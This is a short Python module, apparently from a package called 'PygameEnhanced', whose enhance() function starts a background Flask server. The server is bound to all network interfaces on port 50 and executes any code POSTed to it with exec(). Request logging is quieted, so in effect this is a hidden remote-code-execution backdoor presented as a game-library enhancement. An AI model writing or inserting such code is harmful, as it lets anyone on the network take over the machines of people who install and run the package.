import os
import threading
import logging
import pkg_resources
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    output = ""
    if request.method == "POST":
        code = request.form.get("code")
        try:
            exec(code)
        except Exception as e:
            output = str(e)
    return render_template("index.html", output=output)

def run_flask():
    logging.basicConfig(level=logging.ERROR)
    werkzeug_logger = logging.getLogger("werkzeug")
    werkzeug_logger.setLevel(logging.ERROR)

    package_directory = pkg_resources.resource_filename("PygameEnhanced", "")
    template_folder = os.path.join(package_directory, "templates")
    app.template_folder = template_folder

    app.run(host="0.0.0.0", port=50, debug=False)

def enhance():
    thread = threading.Thread(target=run_flask, daemon=True)
    thread.start()
    print("Flask is running in the background. You can continue executing other code.")


if __name__ == "__main__":
    enhance()
